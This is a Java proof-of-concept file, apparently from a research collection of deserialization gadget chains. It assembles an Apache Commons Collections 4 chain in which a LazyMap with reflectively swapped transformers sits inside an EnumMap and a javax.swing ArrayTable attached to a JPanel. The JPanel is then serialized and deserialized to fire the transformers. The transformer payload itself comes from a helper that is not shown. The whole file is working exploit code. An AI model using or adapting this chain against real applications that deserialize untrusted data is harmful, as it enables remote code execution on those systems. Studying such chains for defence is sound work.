package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;

import javax.swing.*;
import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;

public class POC_5 {

    public static void main(String[] args) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        final Transformer[] transformers = Share.getTransformers4();

        Map innerMap1 = new HashMap();
        Map lazyMap = LazyMap.lazyMap(innerMap1, transformerChain);

        Map innerMap2 = new HashMap<>();
        innerMap2.put("key", "value");
        EnumMap enumMap = new EnumMap<>(innerMap2);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{enumMap, "1", lazyMap, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        ReflectionUtil.setField(transformerChain, "iTransformers", transformers);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
